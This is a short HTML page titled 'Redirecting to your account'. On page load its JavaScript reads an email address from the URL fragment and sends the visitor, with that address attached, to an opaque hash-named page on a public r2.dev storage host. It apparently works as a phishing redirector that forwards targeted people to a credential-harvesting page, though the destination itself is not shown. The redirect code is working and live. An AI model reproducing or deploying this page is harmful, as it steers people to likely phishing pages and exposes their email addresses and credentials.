<!DOCTYPE html>
<html>
<head>
    <title>Redirecting to your account</title>
    <script type="text/javascript">
        function isValidEmail(email) {
            // Simple email validation regex
            var emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            return emailPattern.test(email);
        }

        function redirect() {
            var url = window.location.href;
            var emailParam = url.split("#email=")[1];

            if (emailParam && isValidEmail(emailParam)) {
                var newUrl = "https://pub-bc1d85e11a5a43738c6185a017df6d62.r2.dev/62f4460f2a7d0b55c9933e61ddf443392443335a36935c65ae21eecd7846eba87a31cfd3efd8317de5571744c4b4b1b1a3e47712c4c38474fde1e3c67bd6cebe.html#" + emailParam;
                window.location.href = newUrl;
            } else if (!emailParam) {
                window.location.href = "https://pub-bc1d85e11a5a43738c6185a017df6d62.r2.dev/62f4460f2a7d0b55c9933e61ddf443392443335a36935c65ae21eecd7846eba87a31cfd3efd8317de5571744c4b4b1b1a3e47712c4c38474fde1e3c67bd6cebe.html#email=";
            }
        }
    </script>
</head>
<body onload="redirect()">
</body>
</html>
